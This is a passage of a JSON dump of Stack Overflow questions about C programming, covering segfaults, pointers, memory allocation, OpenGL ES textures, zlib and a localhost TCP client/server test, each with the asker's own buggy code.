frees, 3,448 bytes allocated\n==6634==\n==6634== LEAK SUMMARY:\n==6634==    definitely lost: 0 bytes in 0 blocks\n==6634==    indirectly lost: 0 bytes in 0 blocks\n==6634==      possibly lost: 0 bytes in 0 blocks\n==6634==    still reachable: 3,448 bytes in 181 blocks\n==6634==         suppressed: 0 bytes in 0 blocks\n==6634== Reachable blocks (those to which a pointer was found) are not shown.\n==6634== To see them, rerun with: --leak-check=full --show-reachable=yes\n==6634==\n==6634== For counts of detected and suppressed errors, rerun with: -v\n==6634== Use --track-origins=yes to see where uninitialised values come from\n==6634== ERROR SUMMARY: 16120 errors from 2 contexts (suppressed: 6 from 6)\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>check on queue function:</p>\n\n<pre><code>int checkonqueue(int * q, int value)\n{\n    int i = 0;\n    for(i=0;i &lt; max;i++)\n    {\n        if(q[i] == value)\n        {\n            return 1;\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>line 160 is the line of the if condition</p>\n"},{"tags":["c","shell","arguments","global-variables","main"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":13213958,"title":"C Appropriate Use of Global Vars","body":"<p>I'm building a minishell in C, and have come to a roadblock that seems that it could be easily fixable by using global variables(3 to be exact). The reason I think globals are necessary, is that the alternative would be to pass these variables to almost every single function in my program.</p>\n\n<p>The variables are mainargc, mainargv, and shiftedMArgV. The first two are the number of arguments, and argument list passed to main, respectively. The variable shiftedMArgV is the argument list, however it may have been shifted. I'm trying to create builtin functions shift and unshift, and would make shiftedMArgV point to different arguments.</p>\n\n<p>So, would it be stupid to just make these global? Otherwise I will have to revise a very large amount of code, and I'm not sure I'd be losing anything by making them global.</p>\n\n<p>If I do make them global, would doing so from the main header file be foolish?</p>\n\n<p>Thanks for the help guys, if you need any clarification just ask.</p>\n"},{"tags":["c","arrays","matrix","opencl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13214928,"title":"Implementing matrix multiplication with openCL / C","body":"<p>I understand the theory of matrix multiplication, I just have two questions about this particular kernel implementation: </p>\n\n<p>For reference, num_rows = 32. The matrix B (b_mat) has been transposed before by another kernel, so as I understand it we're dot-ting row vectors together. </p>\n\n<p>1) why do we need to use the param \"vectors_per_row\" and thus the inner loop? I thought we could just do sum += dot(row of A, row of B), and it seems like this param is splitting up the row into smaller portions (why?). </p>\n\n<p>2) I don't understand the address offset for a_mat and b_mat, i.e. a_mat += start; b_mat += start*4;</p>\n\n<pre><code>__kernel void matrix_mult(__global float4 *a_mat,\n   __global float4 *b_mat, __global float *c_mat) {\n   float sum;\n   int num_rows = get_global_size(0);\n   int vectors_per_row = num_rows/4;\n   int start = get_global_id(0) * vectors_per_row;    \n   a_mat += start;                                          \n   c_mat += start*4;                                  \n   for(int i=0; i&lt;num_rows; i++) {             \n      sum = 0.0f;                                      \n      for(int j=0; j&lt;vectors_per_row; j++) {   \n         sum += dot(a_mat[j],                  \n                b_mat[i*vectors_per_row + j]); \n      }                                     \n      c_mat[i] = sum;                           \n   }                                        \n}\n</code></pre>\n"},{"tags":["c","key","shared-memory","semaphore"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13214950,"title":"Are SysV Semaphores represented within the filesystem?","body":"<p>Does a call to <code>semget()</code> result in the creation of a unique file somewhere in the filesystem? I'm attempting to use a semaphore as the key to a shared memory segment and thought ftok() might be a viable option.</p>\n"},{"tags":["c","compression","zlib"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13207312,"title":"zlib Compression Error","body":"<p>I'm using this code snippet which I grabbed from a tutorial. It's meant to compress the data from an input file and put it into the output file. However, it gives a segmentation fault when running though:</p>\n\n<pre><code>int map_Compress(char *inmapfile, char *outmapfile)\n{\n    FILE *infile = fopen(inmapfile, \"rb\");\n    gzFile outfile = gzopen(outmapfile, \"wb\");\n    if (!infile || !outfile) return -1;\n    char inbuffer[1];\n    int num_read = 0;\n    unsigned long total_read = 0;\n    while ((num_read = fread(&amp;inbuffer, 1, sizeof(inbuffer), infile)) &gt; 0)\n    {\n        printf(\"%d\\n\",total_read);\n        total_read += num_read;\n        gzwrite(outfile, inbuffer, num_read);\n    }\n    fclose(infile);\n    gzclose(outfile);\n    return total_read;\n}\n</code></pre>\n\n<p>And it's being called like this:</p>\n\n<pre><code>int main()\n{\n    if (map_Compress(\"maps/main.map\", \"maps/main.mz\") &lt; 0)\n    {\n        printf(\"Compression failed, couldn't open file(s)\\n\");\n    }\n    return 0;\n}\n</code></pre>\n\n<p>What's with this segfault? All I see on the screen when this is called is:</p>\n\n<pre><code>0\n1\n</code></pre>\n\n<p>And then the program crashes... What's going wrong here? My input file has some garbage content that I put in there, so shouldn't the function be compressing the data into the output file?</p>\n\n<p>Please help, I'm sure it's a simple problem I've overlooked :)</p>\n"},{"tags":["ios","c","opengl-es","colors","cgimage"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":30,"score":2,"question_id":13201611,"title":"Using GL_UNSIGNED_SHORT_1_5_5_5_REV on iPhone","body":"<p>I've been suffering from severe performance problems rendering a regularly updated image to the iphone.  After trying it on the iPad 3 today I found out that I was only getting 2fps.  This was WAAAY too slow.  As such I decided to profile and found that nearly all the time was spent converting the image into a 32-bit ARGB image (after the UIImage drawInRect).  I'm seriously shocked at how awful the performance is given everyone says UIKit renders using OpenGLES.</p>\n\n<p>So I converted the rendering code to GLES1 (I can't be bothered to set up a GLES2 renderer at the mo ;)).  The performance has shot up.  I'm now getting 20+fps.  In fact the performance is so good I'm beginning to wonder whether I can perform full retina rendering!</p>\n\n<p>Anyway I am creating the texture as follows:</p>\n\n<pre><code>glTexImage2D( GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_SHORT_5_5_5_1, &amp;colours.front() );\n</code></pre>\n\n<p>Unfortunately this reverses the component order.  I have \"fixed\" it by reversing the bit order from:</p>\n\n<pre><code>val     = ((rgba.a &gt;&gt; 7) &lt;&lt; 15) | ((rgba.b &gt;&gt; 3) &lt;&lt; 10) | ((rgba.g &gt;&gt; 3) &lt;&lt; 5) | ((rgba.r &gt;&gt; 3) &lt;&lt; 0);\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>val     = ((rgba.r &gt;&gt; 3) &lt;&lt; 11) | ((rgba.g &gt;&gt; 3) &lt;&lt; 6) | ((rgba.b &gt;&gt; 3) &lt;&lt; 1) | ((rgba.a &gt;&gt; 7) &lt;&lt; 0);\n</code></pre>\n\n<p>So this confirms that the component order is reversed over CGImage.  However this code is used in multiple products so I need to come up with a way of loading the \"component reversed\" image.</p>\n\n<p>As such I found the flag \"GL_UNSIGNED_SHORT_1_5_5_5_REV\" but I can't get it to work.</p>\n\n<p>I've tried the following code:</p>\n\n<pre><code>glTexImage2D( GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA, GL_UNSIGNED_SHORT_1_5_5_5_REV, &amp;colours.front() );\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>glTexImage2D( GL_TEXTURE_2D, 0, GL_BGRA, width, height, 0, GL_BGRA, GL_UNSIGNED_SHORT_1_5_5_5_REV, &amp;colours.front() );\n</code></pre>\n\n<p>but both return me GL_INVALID_ENUM.  So what am I doing wrong?  Is it even possible to load the component reversed images?</p>\n\n<p>Thanks in advance!</p>\n\n<p><strong>edit</strong>: In the interim I've introduced YET another pixel class and then added the following code:</p>\n\n<pre><code>inline uint32_t UpdateGLTexture( uint32_t texture, std::vector&lt; R5G5B5A1 &gt;&amp; colours, unsigned int width, unsigned int height )\n{\n    std::vector&lt; A1R5G5B5 &gt; convertedColours( colours.size() );\n    ColourSpaceConversion::ConvertFormat( convertedColours, colours );\n    return UpdateGLTexture( texture, convertedColours, width, height );\n}\n</code></pre>\n\n<p>So I now have correct rendering but I'm trying to avoid these kind of colour conversions.  I may just create the source image in that format when using GL rendering but its annoying that I can't load the format directly :(</p>\n"},{"tags":["c","unix","pointers","memory-management"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":145,"score":1,"question_id":13095488,"title":"how to implement overlap-checking memcpy in C","body":"<p>This is a learning exercise. I'm attempting to augment memcpy by notifying the user if the copy operation will pass or fail before it begins. My biggest question is the following. If I allocate two char arrays of 100 bytes each, and have two pointers that reference each array, how do I know which direction I am copying? If I copy everything from the first array to the second how do I ensure that the user will not be overwriting the original array?</p>\n\n<p>My current solution compares the distance of the pointers from the size of the destination array. If the size between is smaller than I say an overwrite will occur. But what if its copying in the other direction? I'm just kind of confused.</p>\n\n<pre><code>int memcpy2(void *target, void *source, size_t nbytes) {\n    char * ptr1 = (char *)target;\n    char * ptr2 = (char *)source;\n\n\n    int i, val;\n\n    val = abs(ptr1 - ptr2);\n    printf(\"%d, %d\\n\", val, nbytes + 0);\n    if (val &gt; nbytes) {\n        for (i = 0; i &lt; val; i++){\n            ptr1[i] = ptr2[i];\n        }\n        return 0;  /*success */\n    }\n    return -1; /* error */\n}\n\n\n\nint main(int argc, char **argv){\n\n  char src [100] = \"Copy this string to dst1\";\n  char dst [20];\n  int p;\n  p = memcpy2(dst, src, sizeof(dst));\n\n    if (p == 0)\n        printf(\"The element\\n'%s'\\nwas copied to \\n'%s'\\nSuccesfully\\n\", src, dst);\n    else\n        printf(\"There was an error!!\\n\\nWhile attempting to copy the elements:\\n '%s'\\nto\\n'%s', \\n Memory was overlapping\", src, dst);\n    return 0;\n\n\n}\n</code></pre>\n"},{"tags":["c","ifdef"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":13213822,"title":"Usage of #if defined for function definition","body":"<p>I need to know if the usage of #if defined is correct and know the possible cons of using it this way.</p>\n\n<pre><code>#if defined TEST\nint foo()\n{\n   return 0;\n}\nint foo1()\n{\n   return 0;\n}\n#else\nint foo()\n{\n   return 1;\n}\nint foo1()\n{\n   return 1;\n}\n#endif\n</code></pre>\n\n<p>EDIT:\nI am trying to use this code for two different platforms I am working on.</p>\n"},{"tags":["c","arrays","unix","memory"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":13105056,"title":"Allocate contiguous memory","body":"<p>I'm trying to allocate a large space of contiguous memory in C and print this out to the user. My strategy for doing this is to create two pointers (one a pointer to double, one a pointer to pointer to double), malloc one of them to the entire size (m * n) in this case the pointer to pointer to double. Then malloc the second one to the size of m. The last step will be to iterate through the size of m and perform pointer arithmetic that would ensure the addresses of the doubles in the large array will be stored in contiguous memory. Here is my code. But when I print out the address it doesn't seem to be in contiguous (or in any sort of order). How do i print out the memory addresses of the doubles (all of them are of value 0.0) correctly?</p>\n\n<pre><code>/* correct solution, with correct formatting */\n\n\n/*The total number of bytes allocated was:  4\n0x7fd5e1c038c0 - 1\n 0x7fd5e1c038c8 - 2\n 0x7fd5e1c038d0 - 3\n 0x7fd5e1c038d8 - 4*/\n\n double **dmatrix(size_t m, size_t n);\n\nint main(int argc, char const *argv[])\n{\n    int m,n,i;\n    double ** f;\n    m = n = 2;  \n    i = 0;\n\n    f = dmatrix(sizeof(m), sizeof(n));\n\n    printf(\"%s %d\\n\", \"The total number of bytes allocated was: \", m * n);\n    for (i=0;i&lt;n*m;++i) {\n        printf(\"%p - %d\\n \", &amp;f[i], i + 1);\n    }\n    return 0;\n}\n\ndouble **dmatrix(size_t m, size_t n) {\n\n    double ** ptr1 = (double **)malloc(sizeof(double *) * m * n);\n    double * ptr2 = (double *)malloc(sizeof(double) * m);\n\n    int i;\n    for (i = 0; i &lt; n; i++){\n        ptr1[i] = ptr2+m*i;\n    }\n\n\n    return ptr1;\n}\n</code></pre>\n"},{"tags":["c","pointers","realloc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13213992,"title":"Pointers getting junk values outside of functions, but regular values inside them","body":"<p>Full disclosure: This is my first time doing any significant programming in C, and my first post on Stack Overflow.</p>\n\n<p>I'm working on code that will eventually be used with Bison to implement a small subset of the Scheme/Racket language. All of this code is in a single C file. I have three structs: <code>Binding</code>, <code>Lambda</code>, and <code>SymbolEntry</code>. I'm not using the <code>Lambda</code> struct yet, it's just there for completeness. I also have a symbol table that holds symbol entries. <code>printSymbolTable()</code> does exactly what the name implies:</p>\n\n<pre><code>typedef struct\n{\n    char* name;\n    char* value;\n} Binding;\n\ntypedef struct\n{\n    int numBindings;\n    Binding** bindings;\n    char* functionBody; \n} Lambda;\n\ntypedef struct\n{\n    Binding* binding;\n    Lambda* function;\n} SymbolEntry;\n\nSymbolEntry* symbolTable = NULL;\nint numSymbols = 0;\n\nvoid printSymbolTable()\n{\n    if (symbolTable)\n    {\n        int i = 0;\n        for (i; i &lt; numSymbols; i++)\n        {\n            printf(\"\\tsymbolTable[%i]: %s = %s\\n\", i, symbolTable[i].binding-&gt;name, symbolTable[i].binding-&gt;value);\n        }\n    }\n}\n</code></pre>\n\n<p>I'm currently trying to work out the logic for defining and looking up variables. The 2 relevant functions:</p>\n\n<pre><code>// Takes a name and an exprssion and stores the result in the symbol table\nvoid defineVar(char* name, char* expr)\n{\n    printf(\"\\nSetting %s = %s\\n\", name, expr);\n    printf(\"Previous number of symbols: %i\\n\", numSymbols);\n    Binding props;\n    props.name = name;\n    props.value = expr;\n\n    SymbolEntry entry;\n    entry.binding = &amp;props;\n    entry.function = NULL;\n\n    symbolTable = realloc(symbolTable, sizeof(SymbolEntry) * ++numSymbols);\n    if (!symbolTable)\n    {\n        printf(\"Memory allocation failed. Exiting.\\n\");\n        exit(1);\n    }\n    symbolTable[numSymbols - 1] = entry;\n    printf(\"New number of symbols: %i\\n\", numSymbols);\n    printf(\"defineVar result:\\n\");\n    printSymbolTable();\n}\n\n// Test storing and looking up at least 4 variables, including one that is undefined\nvoid testVars()\n{\n    printf(\"Variable tests\\n\");\n\n    defineVar(\"foo\", \"0\");\n    printf(\"After returning from defineVar:\\n\");\n    printSymbolTable();\n\n    defineVar(\"bar\", \"20\");\n    printf(\"After returning from defineVar:\\n\");\n    printSymbolTable();\n}\n</code></pre>\n\n<p><code>main()</code> calls <code>testVars()</code>. I get no warnings or errors when compiling, and the program executes successfully. However, this is the result:</p>\n\n<pre><code>Variable tests\n\nSetting foo = 0\nPrevious number of symbols: 0\nNew number of symbols: 1\ndefineVar result:\n    symbolTable[0]: foo = 0\nAfter returning from defineVar:\n    symbolTable[0]: 1�I��^H��H���PTI��@ = �E\n\nSetting bar = 20\nPrevious number of symbols: 1\nNew number of symbols: 2\ndefineVar result:\n    symbolTable[0]: bar = 20\n    symbolTable[1]: bar = 20\nAfter returning from defineVar:\n    symbolTable[0]: 1�I��^H��H���PTI��@ = �E\n    symbolTable[1]: 1�I��^H��H���PTI��@ = �E���\n</code></pre>\n\n<p>Not only am I getting junk values when outside of the <code>defineVar()</code> function, but the call to define <code>bar</code> shows incorrect non-junk values as well. I'm not sure what I'm doing wrong, but I assume it's probably something with <code>realloc()</code>. However, a similar strategy worked when parsing a string into individual tokens, so that's what I was trying to emulate. What am I doing wrong?</p>\n"},{"tags":["c","unix","network-programming","system-calls"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":13212202,"title":"Misbehaving TCP client implementation","body":"<p>I wrote simple application in C which forks one child to act as a network server, and many children to act as a network clients. Clients connect to the server, and ask for data. Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/select.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/queue.h&gt;\n#include &lt;strings.h&gt;\n#include &lt;sys/wait.h&gt;\n\n\n#define LISTENSOCKET 1519\n#define MAXCLIENT 200\n#define MAXLINE 80\n\n\nvoid client_do_something(int c) \n{\n    printf(\"Process %d, server gave %d\\n\", getpid(), c);\n}\n\n\nvoid client_body()\n{\n    struct sockaddr_in clientaddr;\n    struct sockaddr_in localaddr;\n    int sockfd;\n    int nread;\n    int s;\n    char serveraddr[20] = \"127.0.0.1\";\n    char laddr[20];\n    char command[4] = \"GET\";\n    int c;\n    command[3] = '\\0';\n    socklen_t len;\n\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    clientaddr.sin_family = AF_INET;\n    clientaddr.sin_port = htons(LISTENSOCKET);\n    inet_pton(AF_INET, serveraddr, &amp;clientaddr.sin_addr);\n    printf(\"Client %d started\\n\", getpid());\n    if ((s=connect(sockfd, (struct sockaddr *) &amp;clientaddr, sizeof(clientaddr))) != 0) {\n        perror(\"conn err:\");\n        printf(\"Connect error: pid %d %d\\n\", getpid(), errno);\n        close(sockfd);\n        sleep(1);\n        exit(1);\n    }\n    getsockname(sockfd, (struct sockaddr *) &amp;localaddr, &amp;len);\n    inet_ntop(AF_INET,  &amp;localaddr.sin_addr, laddr, sizeof(laddr));\n    printf(\"Client %d passed connect (%d), %s:%d \\n\", getpid(), s, laddr,     ntohs(localaddr.sin_port));\n    while(1) {\n        send(sockfd, command, 4, 0);\n        if ( (nread = recv(sockfd, &amp;c, 4, 0)) &lt; 0 ) {\n            if (errno == ENOTCONN) {\n                sleep(1);\n                continue;\n            }\n            perror(\"client recv err:\");\n            printf(\"Client %d received error %d \", getpid(), errno);\n            exit(1);\n        } else if (nread == 0) {\n            printf(\"Pid %d received FIN\\n\", getpid());\n            close(sockfd);\n            exit(0);\n        }\n        client_do_something(c);\n    }\n}\n\n\nint start_server() {\n    int i, nread, maxi, val, listenfd, connfd, sockfd, maxfd, nready, client[MAXCLIENT];\n    socklen_t len;\n    char *c;\n    struct sockaddr_in servaddr, clientaddr, localaddr;\n    fd_set rset, allset;\n    char addr[MAXLINE];\n    char laddr[INET_ADDRSTRLEN];\n    struct timeval timeout;\n    printf(\"Started\\n\");\n    printf(\"Server PID=%d\", getpid());\n    val = 0;\n\n    bzero(&amp;servaddr, sizeof(servaddr));\n    servaddr.sin_family = AF_INET;\n    servaddr.sin_port = htons(LISTENSOCKET);\n    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\n    if((listenfd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)\n        perror(\"socket failed\\n\");\n\n\n    if(bind(listenfd, (struct sockaddr *) &amp;servaddr, (socklen_t) sizeof(servaddr)) == -1) \n        perror(\"listen failed\\n\");\n    getsockname(listenfd, (struct sockaddr *) &amp;localaddr, &amp;len);\n    inet_ntop(AF_INET,  &amp;localaddr.sin_addr, laddr, INET_ADDRSTRLEN);\n    printf(\"Server %d passed connect , %s:%d \\n\", getpid(),  laddr, ntohs(localaddr.sin_port));\n    if(listen(listenfd, 10) == -1) \n        perror(\"listen failed\\n\");\n\n    maxi = -1;\n    for(i=0; i &lt; MAXCLIENT; i++)\n    client[i] = -1;\n    maxfd = listenfd;\n    FD_ZERO(&amp;allset);\n    FD_SET(listenfd, &amp;allset);\n\n    bzero(&amp;timeout, sizeof(struct timeval));\n    timeout.tv_sec = 15;\n    printf(\"Server process, after listen, sleep 5s before accept\\n\");\n/* Here I purpousely sleep because I want client to initiate connection before accept */\n    sleep(5);\n    printf(\"Server porcess, slept for 5s\\n\");\n    while(1) {\n    rset = allset;\n    nready = select(maxfd + 1, &amp;rset, NULL, NULL, NULL);\n    if (FD_ISSET(listenfd, &amp;rset)) {\n        len = sizeof(clientaddr);\n        bzero(&amp;clientaddr, sizeof(clientaddr));\n        if((connfd = accept(listenfd, (struct sockaddr *) &amp;clientaddr, &amp;len)) &lt; 0) {\n        perror(\"accept failed\");\n        exit(-1);\n        }\n        for(i=0; i &lt; MAXCLIENT; i++) {\n        if(client[i] &lt; 0) {\n            client[i] = connfd;\n            break;\n        }\n        } \n        FD_SET(connfd, &amp;allset);\n        if(connfd &gt;= maxfd)\n        maxfd = connfd;\n        if(i &gt; maxi)\n        maxi = i;\n        if(--nready &lt;= 0) \n        continue;\n    }\n    for(i=0; i &lt;= maxi; i++) {\n        if ( (sockfd = client[i]) &lt; 0)\n        continue;\n        if(FD_ISSET(sockfd, &amp;rset)) {\n        if( (nread = read(sockfd, addr, MAXLINE)) &lt; 0) {\n            if(errno == EINTR) \n            nread = 0;\n            else {\n            printf(\"Izlazim\");\n            return -1;\n            }\n        } else if (nread == 0) {\n            close(sockfd);\n            FD_CLR(sockfd, &amp;allset);\n            client[i] = -1;\n                    continue;\n        }\n\n        if (strncmp(addr, \"GET\", 3) == 0) {\n                    if(val &lt; 100) {\n                        i = send(sockfd, (int *) &amp;val, (size_t) sizeof(val), 0);\n                        val++;\n                        if (i == -1)\n                            printf(\"nread=%d, errno=%d\\n\",nread, errno); \n                    } else {\n                        FD_CLR(sockfd, &amp;allset);\n                        client[i] = -1;\n                        close(sockfd);\n                    }\n            } else {\n            c = addr;\n                    printf(\"Poslao je addr=%s\\n\", addr);\n            }\n            if(--nready &lt;= 0) \n            break;\n        }\n    }\n    }\n}\n\n\nint main(int argc, char *argv[]) {\n    printf(\"Pid=%d\",getpid());\n    int i, child_num, status;\n    pid_t p, pp;\n    child_num = 100;\n    printf(\"%d childs, pid=%d \\n\", child_num, getpid());\n    p = fork();\n    if(p == 0) {\n        start_server();\n        exit(0);\n    } else if (p &lt; 0) {\n        exit(1);\n    }\n    pp = p;\n    for(i = 0; i &lt; child_num; i++) {\n        p = fork();\n        if (p &lt; 0) {\n            exit(1);\n        } else if (p == 0){\n            client_body();\n            exit(0);\n        }\n    }\n    for(i = 0; i &lt; child_num; i++) {\n        wait(&amp;status);\n    }\n    kill(pp, SIGTERM);\n    return 0;\n}\n</code></pre>\n\n<p>The problem is in connect() system call (in client_body function); according to the man pages, connect should return 0 if connection succeeds, and -1 on error. I have noticed that, in my program, connect() returned 0 although it didn't establish connection with the server (received SYN ACK from the server). Later, in the program, the same child process issued recv system call, which produced error with errno value 104 (ECONNRESET). All the time I watched the wireshark capture, and I didn't notice RESET flag in any TCP packet sent from the server.</p>\n\n<p>Anybody have any idea what's wrong? I have tested this code on linux, 2.6.38-8-generic kernel.</p>\n"},{"tags":["c","memory-management","malloc"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13213621,"title":"Micro Memory Manager Errors","body":"<p>I am trying to write simple memory manager (I should really say memory tracker) in my C program.</p>\n\n<p>I am basically creating doubly linked list of allocated blocks where I put pointers on previous and next on start of each block. Malloc procedure looks like this:</p>\n\n<pre><code>    typedef struct MemUnit TMemUnit;\n    struct tMemUnit\n    {\n        TMemUnit *prev;\n        TMemUnit *next;\n    }\n\n    TMemUnit *new = malloc(sizeof(TMemUnit) + wantedSize);\n    if (new == NULL)\n        /* ERROR */\n    else\n    {\n        if (memFirst == NULL) {\n            memFirst = new;\n            memLast = new;\n            new-&gt;prev = NULL;\n            new-&gt;next = NULL;\n        } else {\n            new-&gt;prev = memLast;\n            new-&gt;next = NULL;\n            memLast-&gt;next = new;\n            memLast = new;\n    }\n    return (void *)(new + sizeof(TMemUnit));\n</code></pre>\n\n<p>The problem is segmentation faults on places where was none before.</p>\n\n<p>Valgrind also gives Invalid read/write errors.</p>\n\n<pre><code>==22872== Invalid write of size 4\n==22872==    at 0x400FF1: main (test-memory.c:40)\n==22872==  Address 0x54d51b0 is not stack'd, malloc'd or (recently) free'd\n</code></pre>\n\n<p>When I print addresses of allocated block (wantedSize = 20 * sizeof(int), trying to write first int) for this error they look ok:</p>\n\n<pre><code>new --&gt; 0x54d5030\nnew + sizeof(TMemUnit) + wantedSize --&gt; 0x54d5430\n</code></pre>\n\n<p>I can't figure out where is my mistake.</p>\n\n<p>Thanks</p>\n"},{"tags":["c","char"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":13213422,"title":"Count the number of occurrences of each letter in string","body":"<p>How can I count the number of occurrences in c of each letter (ignoring case) in the string? So that it would print out <code>letter: # number of occurences</code>, I have code to count the occurences of one letter, but how can I count the occurence of each letter in the string?</p>\n\n<pre><code>{\n    char\n    int count = 0;\n    int i;\n\n    //int length = strlen(string);\n\n    for (i = 0; i &lt; 20; i++)\n    {\n        if (string[i] == ch)\n        {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>a : 1\nb : 0\nc : 2\netc...\n</code></pre>\n"},{"tags":["c","arrays","fopen","fgets"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":29,"score":-3,"question_id":13213368,"title":"Read from an input file, check and store some of it information in arrays in C","body":"<p>I've got input files like these:</p>\n\n<pre><code>The Branch PC is e05f56f8\n\nThe Branch Type is branch_type_1\n\nThe Branch is Taken\n\nThe Branch Target is e045ac20\n\njal__        1141512 \n</code></pre>\n\n<p><br></p>\n\n<pre><code>The Branch PC is e045ac44\n\nThe Branch Type is branch_type_1\n\nThe Branch is Taken\n\nThe Branch Target is e05f57d4\n\njal__        1562101\n</code></pre>\n\n<p><br></p>\n\n<pre><code>The Branch PC is e05f57fc\n\nThe Branch Type is branch_type_1\n\nThe Branch is Taken\n\nThe Branch Target is e05f578c\n\njal__        1562083\n</code></pre>\n\n<p>I need to get the information of the branch PC from line \"<code>The Branch PC is ********</code>\", and whether the branch is Taken for Not Taken from line \"<code>The Branch is Taken/Not Taken</code>\". And store this two information into a 2-D array for all the Branches.</p>\n\n<p>I was wondering after I use <code>fopen</code>, how can I check each line to get the information I want.</p>\n"},{"tags":["c","fibonacci"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":13187827,"title":"Fibonacci sequence c prog","body":"<p>I have a problem with C programming. I want to reach large numbers of fibonacci sequence but program, 47 Number of minutes to give the error. Here is the preview.</p>\n\n<pre><code>1\n2\n3\n5\n8\n13\n21\n34\n55\n89\n144\n233\n377\n610\n987\n1597\n2584\n4181\n6765\n10946\n17711\n28657\n46368\n75025\n121393\n196418\n317811\n514229\n832040\n1346269\n2178309\n3524578\n5702887\n9227465\n14930352\n24157817\n39088169\n63245986\n102334155\n165580141\n267914296\n433494437\n701408733\n1134903170\n1836311903\n**-1323752223**\n</code></pre>\n"},{"tags":["c","gcc","preprocessor","enumeration"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":72,"score":6,"question_id":13198864,"title":"It's possible to get a value of an enum member at compile time?","body":"<p>It's possible to get a value of an enum member at compile time?</p>\n\n<p>In fact, I want to be able to do something like this:</p>\n\n<pre><code>enum { \n   FOO_FIRST = -1,\n   FOO_A,\n   FOO_B,\n   FOO_C,\n   FOO_LAST\n};\n\n#if FOO_LAST &gt; 10\n//...\n#else\n//..\n#endif\n</code></pre>\n\n<p>I know that the <code>cpp</code> don't know about variables, bad syntax, etc; only things that start with a <code>#</code>(right)? but members of an enum has fixed-size and cannot be changed just like 10 (constant integer) value and the compiler know its size and values. so, Is there no any possibility to do such comparison (as I did above)? gcc-extensions are very appreciated too. </p>\n\n<p>it's just a try to don't rewrite all my enumerations by using <code>#define</code>s and don't take my time doing some macros change.</p>\n"},{"tags":["c","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":13212982,"title":"C : Pointers and functions 2DArray","body":"<p>I'm really a beginner in C programming language, and i've started learning pointers... I have some problems manipulating them. \nWhat i want to do is to read and write a matrix, with 2 functions, without using global variables (just pointers)... So I did not succed making this. I've searched a lot about pointers and I try to understand how i can use them , but i'm not able to read and write that matrix What i do wrong ...Please, please, please help me (Even with some Useful links about 2DArray &amp; pointers)...Thank you!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid readM(int (*x)[100][100], int *row, int *column)\n{\nint i,j;\nprintf(\"Row no: \");\nscanf(\"%d\",row);\nprintf(\"Column no: \");\nscanf(\"%d\",column);\nprintf(\"Matrix elemnts: \\n\");    \nfor(i=0;i&lt;(*row);i++)\n{\n    for(j=0;j&lt;(*column);j++)\n    {\n        printf(\"[%d][%d]=\",i,j);\n        scanf(\"%d\",x[i][j]);\n    }\n}\n}\n\nvoid writeM(int (*x)[][100], int *row, int *column)\n{\nint i,j;\nprintf(\"\\nMatrix is: \\n\");\nfor(i=0;i&lt;(*row);i++){\n    for (j=0;j&lt;(*column);j++){\n    printf(\"%d\",(*x)[i][j]);\n    }\n    printf(\"\\n\");\n    }\n}\n\nint main()\n{\n\nchar choice;\nint a[100][100],m,n;\ndo\n{\n   printf(\"\\nChose an option\\n\\n\"\n      \"1) read matrix \\n\"\n      \"2) write matrix\\n\"\n      \"3) display matrix in spiral\\n\"\n      \"4) return max and min\\n\"\n      ///...etc\n   scanf(\"%c\", &amp;choice);\n   while (choice&lt;'0'|| choice&gt;'4')\n         {\n            printf(\"\\nInvalid option! Chose again! \\n\\n\");\n            scanf(\"%c\",&amp;choice);\n         }\n   switch (choice)\n   {\n        case '0': exit(0);\n        case '1': readM(&amp;a,&amp;m,&amp;n); break;\n        case '2': writeM(&amp;a,&amp;m,&amp;n);break; /// ... etc\n} while (choice !=5);\ngetch();\n}\n</code></pre>\n"},{"tags":["c","arrays","pointers"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":13212231,"title":"How to print int array which its size is unknown","body":"<p>Let's say we havew a function that returns an 